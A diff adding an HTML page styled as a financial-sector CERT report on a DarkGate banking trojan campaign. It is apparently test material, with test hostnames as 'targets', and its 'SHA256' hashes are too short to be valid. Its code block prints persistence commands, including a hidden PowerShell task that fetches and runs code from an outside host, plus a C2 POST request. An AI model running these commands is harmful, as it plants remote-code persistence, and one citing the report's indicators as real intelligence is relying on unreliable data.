@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DarkGate Banking Trojan Analysis | FinCERT Intelligence</title>
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'Outfit', sans-serif;
+            background: #0f0f0f;
+            color: #f5f5f5;
+            line-height: 1.8;
+        }
+        
+        .gradient-bar {
+            height: 4px;
+            background: linear-gradient(90deg, #00d4aa, #00b4d8, #9d4edd);
+        }
+        
+        header {
+            background: rgba(15, 15, 15, 0.95);
+            backdrop-filter: blur(20px);
+            padding: 20px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .header-content {
+            max-width: 1100px;
+            margin: 0 auto;
+            padding: 0 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            font-size: 22px;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00d4aa, #00b4d8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -1px;
+        }
+        
+        .nav-pills {
+            display: flex;
+            gap: 8px;
+        }
+        
+        .nav-pills a {
+            color: #888;
+            text-decoration: none;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+        
+        .nav-pills a:hover {
+            background: rgba(255,255,255,0.1);
+            color: white;
+        }
+        
+        .container {
+            max-width: 850px;
+            margin: 0 auto;
+            padding: 60px 40px;
+        }
+        
+        .badge-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 25px;
+            flex-wrap: wrap;
+        }
+        
+        .badge {
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        .badge-threat { background: linear-gradient(135deg, #ff6b6b, #ee5a5a); color: white; }
+        .badge-sector { background: rgba(0, 212, 170, 0.2); color: #00d4aa; border: 1px solid rgba(0, 212, 170, 0.3); }
+        .badge-region { background: rgba(0, 180, 216, 0.2); color: #00b4d8; border: 1px solid rgba(0, 180, 216, 0.3); }
+        
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 700;
+            line-height: 1.2;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            color: #888;
+            font-weight: 300;
+            margin-bottom: 30px;
+        }
+        
+        .meta-info {
+            display: flex;
+            align-items: center;
+            gap: 25px;
+            padding: 25px 0;
+            border-top: 1px solid rgba(255,255,255,0.1);
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            margin-bottom: 40px;
+            font-size: 14px;
+            color: #666;
+        }
+        
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 600;
+            margin: 50px 0 25px;
+            color: #00d4aa;
+        }
+        
+        h3 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            margin: 35px 0 15px;
+            color: #00b4d8;
+        }
+        
+        p {
+            margin-bottom: 20px;
+            color: #b0b0b0;
+        }
+        
+        .highlight-box {
+            background: linear-gradient(135deg, rgba(0, 212, 170, 0.1), rgba(0, 180, 216, 0.1));
+            border: 1px solid rgba(0, 212, 170, 0.2);
+            border-radius: 16px;
+            padding: 30px;
+            margin: 35px 0;
+        }
+        
+        .highlight-box h4 {
+            color: #00d4aa;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+        }
+        
+        .stats-row {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            margin: 35px 0;
+        }
+        
+        .stat-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 25px;
+            text-align: center;
+        }
+        
+        .stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #00d4aa, #00b4d8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .stat-label {
+            font-size: 12px;
+            color: #666;
+            margin-top: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .ioc-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 25px;
+            margin: 35px 0;
+        }
+        
+        .ioc-card {
+            background: rgba(255,255,255,0.02);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 12px;
+            padding: 25px;
+        }
+        
+        .ioc-card h4 {
+            font-size: 13px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 15px;
+        }
+        
+        .ioc-item {
+            font-family: 'Fira Code', monospace;
+            font-size: 13px;
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .ioc-item:last-child { border-bottom: none; }
+        
+        .ioc-type {
+            background: rgba(157, 78, 221, 0.2);
+            color: #9d4edd;
+            padding: 3px 8px;
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: 600;
+            min-width: 50px;
+            text-align: center;
+        }
+        
+        .ioc-value { color: #e0e0e0; word-break: break-all; }
+        
+        .hostname-tag {
+            background: linear-gradient(135deg, rgba(255, 193, 7, 0.2), rgba(255, 152, 0, 0.2));
+            color: #ffc107;
+            padding: 3px 10px;
+            border-radius: 6px;
+            font-family: 'Fira Code', monospace;
+            font-size: 13px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 30px 0;
+            font-size: 14px;
+        }
+        
+        th {
+            background: rgba(0, 212, 170, 0.1);
+            color: #00d4aa;
+            padding: 15px 20px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 12px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        td {
+            padding: 15px 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            color: #b0b0b0;
+        }
+        
+        tr:hover { background: rgba(255,255,255,0.02); }
+        
+        .ttp-code {
+            background: rgba(255, 107, 107, 0.2);
+            color: #ff6b6b;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-family: 'Fira Code', monospace;
+            font-size: 12px;
+        }
+        
+        .code-block {
+            background: #1a1a1a;
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 30px 0;
+            font-family: 'Fira Code', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+        }
+        
+        .code-block .line-num {
+            color: #444;
+            margin-right: 20px;
+            user-select: none;
+        }
+        
+        .code-block .keyword { color: #9d4edd; }
+        .code-block .string { color: #00d4aa; }
+        .code-block .comment { color: #555; }
+        .code-block .function { color: #00b4d8; }
+        
+        .sector-list {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .sector-chip {
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            padding: 10px 18px;
+            border-radius: 25px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .sector-chip span { font-size: 1.2rem; }
+        
+        blockquote {
+            border-left: 3px solid #9d4edd;
+            padding: 20px 25px;
+            margin: 30px 0;
+            background: rgba(157, 78, 221, 0.1);
+            border-radius: 0 12px 12px 0;
+            font-style: italic;
+            color: #999;
+        }
+        
+        .warning-banner {
+            background: linear-gradient(135deg, rgba(255, 107, 107, 0.15), rgba(255, 107, 107, 0.05));
+            border: 1px solid rgba(255, 107, 107, 0.3);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 35px 0;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+        
+        .warning-icon {
+            font-size: 1.5rem;
+            flex-shrink: 0;
+        }
+        
+        .warning-content h4 {
+            color: #ff6b6b;
+            margin-bottom: 8px;
+        }
+        
+        .warning-content p {
+            margin: 0;
+            color: #ccc;
+            font-size: 14px;
+        }
+        
+        footer {
+            border-top: 1px solid rgba(255,255,255,0.1);
+            padding: 40px;
+            text-align: center;
+            color: #444;
+            font-size: 13px;
+        }
+    </style>
+</head>
+<body>
+    <div class="gradient-bar"></div>
+    
+    <header>
+        <div class="header-content">
+            <div class="logo">FinCERT Intelligence</div>
+            <div class="nav-pills">
+                <a href="#">Reports</a>
+                <a href="#">Advisories</a>
+                <a href="#">IOC Feed</a>
+                <a href="#">About</a>
+            </div>
+        </div>
+    </header>
+    
+    <div class="container">
+        <article>
+            <div class="badge-row">
+                <span class="badge badge-threat">High Severity</span>
+                <span class="badge badge-sector">Financial Services</span>
+                <span class="badge badge-region">Europe & Americas</span>
+            </div>
+            
+            <h1>DarkGate Banking Trojan: New Campaign Targeting European Financial Institutions</h1>
+            <p class="subtitle">Advanced credential harvesting malware leverages legitimate remote access tools for persistence and lateral movement</p>
+            
+            <div class="meta-info">
+                <span>📅 December 5, 2024</span>
+                <span>🔬 Malware Analysis Division</span>
+                <span>⏱️ 14 min read</span>
+                <span>🔄 Updated: Dec 7</span>
+            </div>
+            
+            <div class="stats-row">
+                <div class="stat-card">
+                    <div class="stat-value">156</div>
+                    <div class="stat-label">Banks Targeted</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">€2.3M</div>
+                    <div class="stat-label">Losses Reported</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">12</div>
+                    <div class="stat-label">Countries</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value">89</div>
+                    <div class="stat-label">IOCs Identified</div>
+                </div>
+            </div>
+            
+            <h2>Executive Overview</h2>
+            <p>FinCERT has identified a significant campaign distributing the DarkGate banking trojan targeting financial institutions across Western Europe and Latin America. The campaign, active since September 2024, has evolved to include advanced evasion techniques and leverages legitimate remote access software for persistent access to compromised systems.</p>
+            
+            <p>Initial infection vectors include malspam campaigns impersonating major payment processors and banking regulators. Post-compromise activity has been observed on systems in <strong>Frankfurt</strong>, <strong>London</strong>, <strong>Madrid</strong>, <strong>São Paulo</strong>, and <strong>Mexico City</strong>.</p>
+            
+            <div class="warning-banner">
+                <span class="warning-icon">⚠️</span>
+                <div class="warning-content">
+                    <h4>Active Campaign Warning</h4>
+                    <p>This campaign is actively evolving. Financial institutions should implement the recommended detection rules immediately and monitor for the IOCs provided below.</p>
+                </div>
+            </div>
+            
+            <h2>Targeted Sectors</h2>
+            <div class="sector-list">
+                <div class="sector-chip"><span>🏦</span> Retail Banking</div>
+                <div class="sector-chip"><span>💳</span> Payment Processing</div>
+                <div class="sector-chip"><span>📊</span> Investment Management</div>
+                <div class="sector-chip"><span>🏛️</span> Central Banks</div>
+                <div class="sector-chip"><span>💱</span> Foreign Exchange</div>
+                <div class="sector-chip"><span>🔐</span> Cryptocurrency Exchanges</div>
+            </div>
+            
+            <h2>Technical Analysis</h2>
+            
+            <h3>Initial Access</h3>
+            <p>The threat actor distributes malicious documents via email, often disguised as transaction confirmations or regulatory notices. These documents contain VBA macros that, when executed, download and execute the DarkGate loader. The emails have been observed originating from compromised legitimate email accounts, making detection more difficult.</p>
+            
+            <h3>Compromised Infrastructure</h3>
+            <p>Our analysis has identified several systems consistently targeted across multiple victim organizations. The attackers show particular interest in systems handling wire transfers and SWIFT messaging:</p>
+            
+            <div class="highlight-box">
+                <h4>🎯 Primary Targets</h4>
+                <ul style="list-style: none; margin-top: 15px;">
+                    <li style="padding: 10px 0; display: flex; align-items: center; gap: 15px;">
+                        <span class="hostname-tag">oaev-test-win-05</span>
+                        <span style="color: #888;">Treasury workstation with SWIFT access</span>
+                    </li>
+                    <li style="padding: 10px 0; display: flex; align-items: center; gap: 15px;">
+                        <span class="hostname-tag">oaev-test-win-02</span>
+                        <span style="color: #888;">Payment processing server</span>
+                    </li>
+                    <li style="padding: 10px 0; display: flex; align-items: center; gap: 15px;">
+                        <span class="hostname-tag">oaev-test-linux-01</span>
+                        <span style="color: #888;">Core banking middleware</span>
+                    </li>
+                </ul>
+            </div>
+            
+            <h3>Persistence Mechanism</h3>
+            <p>DarkGate establishes persistence through scheduled tasks and registry modifications. Notably, the malware also installs a legitimate remote access tool (AnyDesk or TeamViewer) configured for unattended access, allowing the threat actor to maintain persistent remote access even if the malware payload is detected and removed.</p>
+            
+            <div class="code-block">
+<span class="line-num">01</span><span class="comment"># Registry persistence via Run key</span>
+<span class="line-num">02</span><span class="keyword">reg add</span> <span class="string">"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"</span> /v <span class="string">"WindowsUpdate"</span>
+<span class="line-num">03</span>    /t REG_SZ /d <span class="string">"C:\Users\Public\update.exe"</span> /f
+<span class="line-num">04</span>
+<span class="line-num">05</span><span class="comment"># Scheduled task for hourly beacon</span>
+<span class="line-num">06</span><span class="keyword">schtasks</span> /create /tn <span class="string">"Adobe Updater"</span> /tr <span class="string">"powershell -w hidden -c IEX(wget honey.scanme.sh/beacon)"</span>
+<span class="line-num">07</span>    /sc hourly /f
+<span class="line-num">08</span>
+<span class="line-num">09</span><span class="comment"># C2 communication</span>
+<span class="line-num">10</span><span class="function">Invoke-WebRequest</span> -Uri <span class="string">"https://cdn-banking-update.com/api/check"</span> -Method POST
+            </div>
+            
+            <h2>MITRE ATT&CK Mapping</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Tactic</th>
+                        <th>ID</th>
+                        <th>Technique</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>Initial Access</td>
+                        <td><span class="ttp-code">T1566.001</span></td>
+                        <td>Spearphishing Attachment</td>
+                    </tr>
+                    <tr>
+                        <td>Execution</td>
+                        <td><span class="ttp-code">T1204.002</span></td>
+                        <td>User Execution: Malicious File</td>
+                    </tr>
+                    <tr>
+                        <td>Persistence</td>
+                        <td><span class="ttp-code">T1547.001</span></td>
+                        <td>Registry Run Keys</td>
+                    </tr>
+                    <tr>
+                        <td>Defense Evasion</td>
+                        <td><span class="ttp-code">T1218.011</span></td>
+                        <td>Rundll32</td>
+                    </tr>
+                    <tr>
+                        <td>Credential Access</td>
+                        <td><span class="ttp-code">T1555.003</span></td>
+                        <td>Credentials from Web Browsers</td>
+                    </tr>
+                    <tr>
+                        <td>Collection</td>
+                        <td><span class="ttp-code">T1056.001</span></td>
+                        <td>Keylogging</td>
+                    </tr>
+                    <tr>
+                        <td>Command and Control</td>
+                        <td><span class="ttp-code">T1219</span></td>
+                        <td>Remote Access Software</td>
+                    </tr>
+                    <tr>
+                        <td>Exfiltration</td>
+                        <td><span class="ttp-code">T1567</span></td>
+                        <td>Exfiltration Over Web Service</td>
+                    </tr>
+                </tbody>
+            </table>
+            
+            <h2>Indicators of Compromise</h2>
+            <div class="ioc-grid">
+                <div class="ioc-card">
+                    <h4>Network Indicators</h4>
+                    <div class="ioc-item">
+                        <span class="ioc-type">IP</span>
+                        <span class="ioc-value">194.26.135.89</span>
+                    </div>
+                    <div class="ioc-item">
+                        <span class="ioc-type">IP</span>
+                        <span class="ioc-value">91.92.240.115</span>
+                    </div>
+                    <div class="ioc-item">
+                        <span class="ioc-type">Domain</span>
+                        <span class="ioc-value">cdn-banking-update.com</span>
+                    </div>
+                    <div class="ioc-item">
+                        <span class="ioc-type">Domain</span>
+                        <span class="ioc-value">honey.scanme.sh</span>
+                    </div>
+                    <div class="ioc-item">
+                        <span class="ioc-type">Domain</span>
+                        <span class="ioc-value">secure-banking-portal.net</span>
+                    </div>
+                </div>
+                <div class="ioc-card">
+                    <h4>File Indicators</h4>
+                    <div class="ioc-item">
+                        <span class="ioc-type">SHA256</span>
+                        <span class="ioc-value">5d41402abc4b2a76b9719d911017c592</span>
+                    </div>
+                    <div class="ioc-item">
+                        <span class="ioc-type">SHA256</span>
+                        <span class="ioc-value">098f6bcd4621d373cade4e832627b4f6</span>
+                    </div>
+                    <div class="ioc-item">
+                        <span class="ioc-type">File</span>
+                        <span class="ioc-value">invoice_12052024.xlsm</span>
+                    </div>
+                    <div class="ioc-item">
+                        <span class="ioc-type">File</span>
+                        <span class="ioc-value">update.exe</span>
+                    </div>
+                    <div class="ioc-item">
+                        <span class="ioc-type">File</span>
+                        <span class="ioc-value">dg_loader.dll</span>
+                    </div>
+                </div>
+            </div>
+            
+            <blockquote>
+                "The level of sophistication in this campaign indicates a well-resourced threat actor with deep knowledge of banking operations. The abuse of legitimate remote access tools significantly complicates detection efforts." — FinCERT Analysis Team
+            </blockquote>
+            
+            <h2>Recommendations</h2>
+            <ul style="margin: 20px 0 20px 25px; color: #b0b0b0;">
+                <li>Implement email filtering rules to detect malicious macro-enabled documents</li>
+                <li>Block unauthorized remote access tools at the network perimeter</li>
+                <li>Enable macro security policies preventing execution from untrusted sources</li>
+                <li>Monitor for scheduled task creation and registry Run key modifications</li>
+                <li>Segment systems with access to payment networks from general corporate networks</li>
+                <li>Implement multi-factor authentication for all remote access</li>
+            </ul>
+        </article>
+    </div>
+    
+    <footer>
+        <p>© 2024 Financial Sector CERT. This intelligence is shared under TLP:WHITE for public distribution.</p>
+    </footer>
+</body>
+</html>
+
